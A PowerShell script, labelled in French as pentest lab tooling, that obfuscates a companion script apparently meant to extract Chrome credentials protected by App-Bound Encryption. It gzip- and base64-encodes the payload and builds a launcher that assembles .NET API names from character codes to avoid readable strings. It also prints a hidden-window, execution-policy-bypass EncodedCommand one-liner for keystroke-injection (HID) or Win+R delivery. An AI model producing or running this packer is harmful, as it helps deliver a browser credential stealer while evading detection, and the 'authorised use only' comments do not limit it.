# Lab pentest : compresse chrome-extract-abe.ps1 + lanceur léger (pas de bypass AMSI).
param(
    [string]$ScriptPath = "$PSScriptRoot\chrome-extract-abe.ps1",
    [string]$OutLauncher = "$PSScriptRoot\chrome-extract-abe.obf.ps1",
    [string]$OutB64 = "$PSScriptRoot\chrome-abe-obf-b64.txt",
    [switch]$EmitEncodedCommand,
    [switch]$SmokeTest
)

if (-not (Test-Path -LiteralPath $ScriptPath)) { throw "Script introuvable : $ScriptPath" }

$raw = [IO.File]::ReadAllText($ScriptPath)
$bytes = [Text.Encoding]::UTF8.GetBytes($raw)
$msIn = New-Object IO.MemoryStream(, $bytes)
$msOut = New-Object IO.MemoryStream
$gzip = New-Object IO.Compression.GZipStream($msOut, [IO.Compression.CompressionMode]::Compress)
$gzip.Write($bytes, 0, $bytes.Length)
$gzip.Dispose()
$b64 = [Convert]::ToBase64String($msOut.ToArray())

# Noms d'API via [char] — évite quelques chaînes lisibles en clair dans le lanceur.
$io = -join ([char[]](73, 79))
$compress = -join ([char[]](67, 111, 109, 112, 114, 101, 115, 115, 105, 111, 110))
$gzipName = -join ([char[]](71, 122, 105, 112, 83, 116, 114, 101, 97, 109))
$decompress = -join ([char[]](68, 101, 99, 111, 109, 112, 114, 101, 115, 115))
$compressMode = -join ([char[]](67, 111, 109, 112, 114, 101, 115, 115, 105, 111, 110, 77, 111, 100, 101))
$scriptblock = -join ([char[]](83, 99, 114, 105, 112, 116, 66, 108, 111, 99, 107))

$launcher = @"
# Genere par pack-chrome-abe-obf.ps1 — machine autorisee / mandat pentest uniquement.
param(
    [string]`$Browser = 'chrome',
    [string]`$ElevatorDir = '',
    [string]`$OutputBase = ''
)
`$ErrorActionPreference = 'Stop'
`$p = @'
$b64
'@
function _u(`$x) {
    `$a = New-Object $io.MemoryStream(,[Convert]::FromBase64String(`$x))
    `$z = New-Object $io.$compress.$gzipName(`$a, [IO.$compress.$compressMode]::$decompress)
    `$b = New-Object $io.MemoryStream
    `$z.CopyTo(`$b)
    [Text.Encoding]::UTF8.GetString(`$b.ToArray())
}
`$sb = [Management.Automation.$scriptblock]::Create((_u `$p))
`$__ld = Split-Path -Parent `$MyInvocation.MyCommand.Path
`$__lab = Join-Path `$__ld '..\lab\chromelevator\extracted'
`$pp = @{}
foreach (`$k in `$PSBoundParameters.Keys) { `$pp[`$k] = `$PSBoundParameters[`$k] }
if ((-not `$pp.ContainsKey('ElevatorDir')) -or [string]::IsNullOrWhiteSpace(`$pp['ElevatorDir'])) {
    if (Test-Path -LiteralPath `$__lab) { `$pp['ElevatorDir'] = (Resolve-Path -LiteralPath `$__lab).Path }
}
& `$sb @pp
"@

[IO.File]::WriteAllText($OutLauncher, $launcher, (New-Object Text.UTF8Encoding $false))
$gzLen = $msOut.Length
Write-Host "Lanceur : $OutLauncher ($($launcher.Length) chars, payload gzip $($bytes.Length) -> $gzLen octets)"

$utf16 = [Text.Encoding]::Unicode.GetBytes($launcher)
$encB64 = [Convert]::ToBase64String($utf16)
$encB64 | Set-Content -LiteralPath $OutB64 -NoNewline -Encoding ASCII
Write-Host "EncodedCommand (lanceur) : $OutB64 ($($encB64.Length) chars)"

if ($EmitEncodedCommand) {
    Write-Host ""
    Write-Host "One-liner lab (HID / Win+R) :"
    Write-Host "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encB64"
}

if ($SmokeTest) {
    Write-Host ""
    Write-Host "Smoke : lanceur obfusque..."
    & pwsh -NoProfile -ExecutionPolicy Bypass -File $OutLauncher
}